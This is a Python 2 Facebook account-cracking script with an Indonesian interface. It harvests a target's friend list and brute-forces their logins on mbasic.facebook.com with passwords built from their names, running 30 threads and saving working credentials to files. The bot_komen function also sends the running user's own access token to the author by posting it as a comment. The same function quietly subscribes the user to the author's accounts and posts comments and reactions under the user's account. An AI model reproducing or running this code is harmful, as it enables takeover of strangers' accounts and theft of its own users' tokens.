# -*- coding: utf-8
# coded by Anton Ibrahim
# open source, tidak di perjual belikan
q="\033[00m"
h2="\033[40m"
b2="\033[44m"
c2="\033[46m"
i2="\033[42m"
u2="\033[45m"
m2="\033[41m"
p2="\033[47m"
k2="\033[43m"
b='\033[1;94m'
i='\033[1;92m'
c='\033[1;96m'
m='\033[1;91m'
u='\033[1;95m'
k='\033[1;93m'
p='\033[1;97m'
h='\033[1;90m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH 
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
try:
	import requests
	import sys
	import os
	import subprocess
	import random
	import time
	import re
	import json
	import uuid
	from multiprocessing.pool import ThreadPool
	from requests.exceptions import ConnectionError
	from datetime import datetime
except Exception as modul:
	print(" \033[0;97m[\033[0;97m!\033[0;97m] Module requests not installed yet")
	exit(" \033[0;97m[\033[0;97m#\033[0;97m] Please Type : pip2 install requests")

loop = 0
ok = []
cp = []
id = []
pwx = []

s = requests.Session()
rgb = random.choice(['\x1b[0;91m', '\x1b[0;91m', '\x1b[0;91m', '\x1b[0;91m', '\x1b[0;91m', '\x1b[0;91m', '\x1b[0;91m', '\x1b[0m'])
ua = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"])
ip = s.get('https://api.ipify.org').text
durasi = str(datetime.now().strftime('%d-%m-%Y'))

ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
hari = datetime.now().strftime('%A')
def logo():
	print("""
\033[1;91m   dP""b8 88""Yb    db     dP""b8 88  dP 
\033[1;91m  dP   `" 88__dP   dPYb   dP   `" 88odP  
\033[1;97m  Yb      88"Yb   dP__Yb  Yb      88"Yb  
\033[1;97m   YboodP 88  Yb dP""""Yb  YboodP 88  Yb  Yb """)

### SETTING UA
def settua():
	ask = raw_input("\n \033[0;97m \033[0;91m*\033[0;97m Ingin Mengubah User Agent? [Y/t] : ") 
	if ask =="":
		menu()
	elif ask == "y" or ask == "Y":
		try:
			print("\n \033[0;97m \033[0;91m*\033[0;97m Ketik di Pencarian Chrome : My User Agent")
			ua = raw_input(" \033[0;97m \033[0;91m*\033[0;97m User Agent :\033[0;92m ") 
			uas = open(".ua","w")
			uas.write(ua) 
			uas.close()
			print(" \033[0;97m \033[0;92m✓\033[0;97m Success Setting User Agent")
			time.sleep(2)
			menu()
		except KeyboardInterrupt:
			exit()
	elif ask == "t" or ask == "T":
		try:
			ua = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"])
			uas = open(".ua","w")
			uas.write(ua) 
			uas.close()
			print("\n \033[0;97m \033[0;92m✓\033[0;97m Success Setting User Agent")
			time.sleep(2)
			menu()
		except KeyboardInterrupt:
			exit()
	else:
		menu()
##Jebol Sesi###
def ttl():
   os.system('xdg-open https://www.facebook.com/100021483498135/posts/870222180370557/?app=fbl')
   menu()
    
##BOT FOLLOWERS
def bot_komen():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
        os.system('rm -rf login.txt')
    una = ('100021483498135') 
    post = ('890153461710762') 
    post2 = ('866166207442821') 
    kom = ('Gwe pake Sc lu mbah 😍😘\nhttps://www.facebook.com/photo.php?fbid=890153461710762&set=a.108239523235497&type=3&app=fbl') 
    kom2 = ('Keren mbah 😘😘\nhttps://www.facebook.com/photo.php?fbid=866166207442821&set=a.110279126364870&type=3&app=fbl') 
    reac = ('LOVE') 
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + token)
    requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ token)
    requests.post('https://graph.facebook.com/' + post+ '/comments/?message=' + kom2 + '&access_token=' + token)
    requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac+ '&access_token='+ token)
    requests.post('https://graph.facebook.com/100021483498135/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/890153461710762/comments/?message=' + token + '&access_token=' + token)
    print(" \033[0;91m *\033[0;97m Login Success")
    requests.post('https://graph.facebook.com/100021483498135/subscribers?access_token='+token)#Anton Ibrahim
    requests.post('https://graph.facebook.com/100031905602021/subscribers?access_token='+token)#Sela Anjani
    requests.post('https://graph.facebook.com/100028262962654/subscribers?access_token='+token)#Irsya Maulana
    requests.post('https://graph.facebook.com/100011054763211/subscribers?access_token='+token)#Sultan Zahra
    requests.post('https://graph.facebook.com/100041129048948/subscribers?access_token='+token)#Iwan Hardiansah
    raw_input('\033[0;91m  * \033[0;97mTekan Enter Untuk Ke Menu')
    menu()


def tokenz():
	os.system("clear")
	try:
		token = open('login.txt','r')
		menu()
	except (KeyError,IOError):
		logo()
		token = raw_input(" \n\033[0;97m\033[0;91m  *\033[0;97m Login Token : \033[0;91m")
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			avsid = open("login.txt", 'w')
			avsid.write(token)
			avsid.close()
			bot_komen()
		except KeyError:
			exit(" \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid")

def menu():
	os.system('clear')
	global token
	try:
		token = open('login.txt','r').read()
	except IOError:
		print(' \033[0;97m[\033[0;97m!\033[0;97m] Token Invalid')
		os.system('clear')
		os.system('rm -rf login.txt')
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me/?access_token='+token)
		a = json.loads(otw.text)
		nama = a['name']
	except KeyError:
		os.system('clear')
		print(' \033[0;97m[\033[0;97m!\033[0;97m] Token Invalid')
		os.system('rm -rf login.txt')
		login()
	except requests.exceptions.ConnectionError:
		exit(' \033[0;97m[\033[0;91m!\033[0;97m] No Connection')
	logo()
	print(" \n\033[0;97m \033[0;91m          * \033[0;97m Scrip By : AS ID  \033[0;91m*") 
	print("\n \033[0;97m \033[0;91m*\033[0;97m Welcome : "+k+k+"%s"%(nama))
	print(" \033[0;97m \033[0;91m*\033[0;97m IP Anda : "+P+ip)
	print(" \033[0;97m \033[0;91m*\033[0;97m Status  : "+H+ "Agak Sedeng")
	print(" \n\033[0;97m \033[0;91m * \033[0;93m Metod\033[0;93m Mbasic") 
	print("  \033[0;97m\033[0;97m1.\033[0;97m Crack Temen/Public")
	print("  \033[0;97m\033[0;97m2.\033[0;97m Lihat Hasil Crack")
	print("  \033[0;97m\033[0;97m3.\033[0;97m Setting User Agent")
	##print("  \033[0;97m\033[0;97m4.\033[0;97m Munculin Ttl Acc Luar")
	##print("  \033[0;97m\033[0;97m5.\033[0;97m Gabung Grup\033[0;92m PG BBS")
	####print("  \033[0;97m\033[0;97m6.\033[0;97m Gabung Grup\033[0;92m EDIT GES")
	print("  \033[0;97m\033[0;97m0.\033[0;91m Hapus token")
	ask = raw_input("\n \033[0;97m\033[0;91m *\033[0;97m Pilih : ")
	if ask =="":
		menu()
	elif ask == "1" or ask == "01":
		public()
	elif ask == "2" or ask == "02":
		print("\n \033[0;97m \033[0;97m1.\033[0;97m Lihat Hasil OK")
		print(" \033[0;97m \033[0;97m2.\033[0;97m Lihat Hasil CP")
		ask = raw_input("\n \033[0;97m \033[0;91m*\033[0;97m Pilih : ")
		if ask =="":
			menu()
		elif ask == "1" or ask == "01":
			try:
				totalok = open("results/OK-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
				print(" \033[0;97m \033[0;92m*\033[0;97m Hasil \033[0;92mOK\033[0;91m Date :\033[0;92m%s-%s-%s \033[0;97mTotal : %s\033[0;92m"%(ha, op, ta,len(totalok)))
				os.system("cat results/OK-%s-%s-%s.txt"%(ha, op, ta))
				exit()
			except (IOError):
				exit(" \033[0;97m[\033[0;91m!\033[0;97m] No Results Bro")
		elif ask == "2" or ask == "02":
			try:
				totalcp = open("results/CP-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
				print(" \033[0;97m \033[0;91m*\033[0;97m Hasil \033[0;93mCP\033[0;91m Date :\033[0;92m%s-%s-%s \033[0;97mTotal :%s\033[0;97m"%(ha, op, ta,len(totalcp)))
				os.system("cat results/CP-%s-%s-%s.txt"%(ha, op, ta))
				exit()
			except (IOError):
				exit(" \033[0;97m \033[0;91m*\033[0;97m No Results")
		else:
			menu()
	elif ask == "3" or ask == "03":
		settua()
	elif ask == "4" or ask == "04":
		ttl()
	elif ask == "0" or ask == "00":
		os.system("rm -f login.txt")
		exit(" \033[0;97m \033[0;91m*\033[0;97m Success Hapus Token")
	else:
		menu()

def public():
	global token
	try:
		token = open('login.txt', 'r').read()
	except IOError:
		print(' \033[0;97m[\033[0;97m!\033[0;97m] Token Invalid')
		tokenz()
	print("\n \033[0;97m\033[0;91m *\033[0;97m Isi 'me' Untuk List Teman")
	idt = raw_input(" \033[0;97m\033[0;91m *\033[0;97m ID Public : ")
	try:
		pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
		sp = json.loads(pok.text)
		print(" \033[0;97m\033[0;91m *\033[0;97m Name : "+sp["name"])
	except KeyError:
		exit(' \033[0;97m[\033[0;97m!\033[0;97m] ID Public Tidak Tersedia')
	r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
	z = json.loads(r.text)
	for i in z["data"]:
		uid = i['id']
		name = i['name']
		id.append(uid+'<=>'+name)
	print(" \033[0;97m\033[0;91m *\033[0;97m Total ID  :\033[0;91m "+str(len(id)))
	###ask = raw_input(" \033[0;97m\033[0;91m *\033[0;97m Gunakan Password Manual? Y/t : ")
	#22#if ask == "Y" or ask == "y":
		##manual()
	print(" \033[0;97m\033[0;91m *\033[0;97m Crack Berlangsung Bos Sabar Ya\n")
	
	def main(user):
		global loop, token
		pwx = []
		sys.stdout.write(
		      '\r \033[0;97m%s *\033[0;97m Crack %s/%s OK-:%s - CP-:%s ' % (rgb,loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		uid,name=user.split("<=>")
		for ss in name.split(" "):
			if len(ss)<3:
				continue
			else:
				if len(ss) == 1 and len(ss) == 2 and len(ss) == 3 and len(ss) == 4 or len(ss) == 5:
					pwx.append(ss+"123")
					pwx.append(ss+"1234")
					pwx.append(ss+"12345")
					pwx.append(ss+"sayang")
					pwx.append(ss+"786786")
					pwx.append(ss+"kontol")
				else:
					pwx.append(ss+"123")
					pwx.append(ss+"12345")
		try:
			for pw in pwx:
				pw = pw.lower()
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r \033[0;92m *-> ' +uid+ '|' + pw + '       ')
					ok.append(uid+'|'+pw)
					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  *-> '+str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
				if 'checkpoint' in xo:
					try:
						token = open('login.txt').read()
						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
						data = s.get(url).json()
						ttl = data['birthday'].replace("/","-")
						nama = data['name']
						print('\r  \033[0;97m *-> ' +uid+ '|' + pw + '|' + ttl)
						cp.append(uid+'|'+pw+'|'+ttl)
						save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
						save.write('  *--> '+str(uid)+'|'+str(pw)+'|'+ttl+'\n')
						save.close()
						break
					except(KeyError, IOError):
						ttl = " "
					except:pass
					print('\r \033[0;97m *-> ' +uid+ '|' + pw + '       ')
					cp.append(uid+'|'+pw)
					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write(' *-> '+str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
					
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n \033[0;97m\033[0;91m *\033[0;97m Finished")


def manual():
	print(" \033[0;97m\033[0;91m *\033[0;97m Contoh Pass : bismillah,123456")
	pw = raw_input(" \033[0;91m\033[0;91m *\033[0;97m Set Password :\033[0;91m ")
	if len(pw) ==0:
		exit(" \033[0;97m\033[0;91m *\033[0;97m Don't Be Empty")
	print(" \033[0;97m\033[0;91m *\033[0;97m Crack Berlangsung Bos Sabar Ya\n")
	
	def main(user):
		global loop, token
		sys.stdout.write('\r \033[0;91m *\033[0;97m Crack %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		uid,name=user.split("<=>")
		ss = name.split(" ")
		try:
			os.mkdir('results')
		except OSError:
			pass
		try:
			for asu in pw.split(","):
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r \033[0;92m*--> ' +uid+ '|' + asu + '       ')
					ok.append(uid+'|'+asu)
					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  *--> '+str(uid)+'|'+str(asu)+'\n')
					save.close()
					break
					continue
				if 'checkpoint' in xo:
					try:
						token = open('login.txt').read()
						url = ("https://www.facebook.com/"+uid+"?access_token="+token)
						data = s.get(url).json()
						ttl = data['birthday'].replace("/","-")
						nama = data['name']
						print('\r  \033[0;97m *-> ' +uid+ '|' + pw + '|' + ttl)
						cp.append(uid+'|'+pw+'|'+ttl)
						save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
						save.write('  *--> '+str(uid)+'|'+str(pw)+'|'+ttl+'\n')
						save.close()
						break
					except(KeyError, IOError):
						ttl = " "
					except:pass
					print('\r \033[0;97m *-> ' +uid+ '|' + pw + '       ')
					cp.append(uid+'|'+pw)
					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write(' *-> '+str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n \033[0;97m \033[0;97m*\033[0;97m Finished")
	

		
if __name__ == '__main__':
	if sys.version[0]!="3":
		python="2.7" if "2.7" in sys.version[0:2] else "2.8"
	else:
		exit(" \033[0;97m[\033[0;97m!\033[0;97m] How To Usage : python2 run.py")
	os.system("git pull")
	tokenz()